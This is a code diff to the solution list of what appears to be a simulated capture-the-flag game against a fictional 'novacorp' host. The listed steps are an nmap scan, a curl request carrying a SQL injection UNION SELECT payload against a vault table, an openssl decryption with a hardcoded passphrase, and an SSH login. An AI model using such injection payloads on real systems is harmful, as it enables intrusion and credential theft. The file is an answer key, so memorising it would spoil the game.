@@ -9,7 +9,9 @@ export const SOLUTION: readonly string[] = [
   'nmap corp-core',
   'curl http://corp-core.novacorp.internal/robots.txt',
   `curl "http://corp-core.novacorp.internal/api/search?q=' UNION SELECT label, value, note FROM vault -- "`,
-  // The injection yields the base64 blob and its passphrase; decrypt to the ssh password.
+  // The injection yields the base64 vault blob and its passphrase. Decrypt it to the ssh password
+  // (the blob is built at load, so it is not a fixed literal here):
+  //   echo <blob> | openssl enc -d -aes-256-cbc -a -k Vault-Core-2026   -> DEPLOY_PASSWORD
   'ssh deploy@corp-core.novacorp.internal',
   'cat root-access.txt',
   `submit ${FLAG}`,
